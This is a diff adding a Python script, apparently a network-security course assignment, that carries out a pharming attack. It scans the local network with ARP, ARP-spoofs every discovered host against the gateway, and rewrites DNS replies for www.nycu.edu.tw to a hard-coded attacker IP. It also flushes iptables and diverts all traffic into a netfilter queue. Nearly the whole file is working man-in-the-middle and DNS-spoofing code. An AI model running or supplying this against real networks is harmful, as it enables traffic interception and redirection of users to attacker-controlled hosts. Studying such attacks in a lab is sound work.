@@ -1,0 +1,82 @@
+#!/usr/bin/env python3
+
+import os
+import sys
+import time
+from netfilterqueue import NetfilterQueue
+import netifaces
+import scapy.all as scapy
+import subprocess
+
+def dns_spoof(pkt):
+	attacker_ip = '140.113.207.241'
+	target_name = 'www.nycu.edu.tw'
+	pkt_scapy = scapy.IP(pkt.get_payload())
+	
+	if pkt_scapy.haslayer(scapy.DNSRR):
+		qname = pkt_scapy[scapy.DNSQR].qname
+	
+		if qname == b'www.nycu.edu.tw.':
+			print("[+] Spoofing target")
+			pkt_scapy[scapy.DNS].an = scapy.DNSRR(rrname=target_name, rdata=attacker_ip)
+			pkt_scapy[scapy.DNS].ancount = 1
+			
+			del pkt_scapy[scapy.IP].len
+			del pkt_scapy[scapy.IP].chksum
+			del pkt_scapy[scapy.UDP].len
+			del pkt_scapy[scapy.UDP].chksum
+			print(pkt_scapy.show())
+			pkt.set_payload(bytes(pkt_scapy))
+
+	pkt.accept()
+
+def pharm():
+	# (task 1)
+	interfaces = netifaces.interfaces()
+	enp0 = [inter for inter in interfaces if inter[:4] == 'enp0'][0]
+	info = netifaces.ifaddresses(enp0)[netifaces.AF_INET][0]
+	addr, netmask = info['addr'], info['netmask']
+	cidr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
+	addr = addr + '/' + str(cidr)
+
+	arp = scapy.ARP(pdst=addr)
+	ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+	packet = ether / arp
+	result = scapy.srp(packet, timeout=3, verbose=0)[0]
+
+	print('Available Devices')
+	print('-------------------------------------')
+	print('IP                  MAC              ')
+	print('-------------------------------------')
+	arp_table = {}
+
+	gateway = netifaces.gateways()['default'][netifaces.AF_INET][0]
+	for sent, received in result:
+		if received.psrc != gateway and received.psrc != addr:
+			print(f'{received.psrc:20}{received.hwsrc:17}')
+		arp_table[received.psrc] = received.hwsrc
+	
+	# (task 2) ARP spoofing
+	for victim_ip in arp_table:
+		if victim_ip == gateway:
+			continue
+		packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=arp_table[victim_ip], psrc=gateway)
+		scapy.send(packet, verbose=False)
+		packet = scapy.ARP(op=2, pdst=gateway, hwdst=arp_table[gateway], psrc=victim_ip)
+		scapy.send(packet, verbose=False)
+
+	# (task 4) DNS spoofing
+	nfqueue = NetfilterQueue()
+	nfqueue.bind(0, dns_spoof)
+	try:
+		print("Start DNS spoofing")
+		nfqueue.run()
+	except KeyboardInterrupt:
+		sys.exit(0)	
+
+if __name__ == '__main__':
+	os.system('sudo iptables -F')
+	os.system('sudo iptables -I FORWARD -j NFQUEUE --queue-num 0')
+	os.system('sudo iptables -I INPUT -j NFQUEUE --queue-num 0')
+	os.system('sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0')
+	pharm()
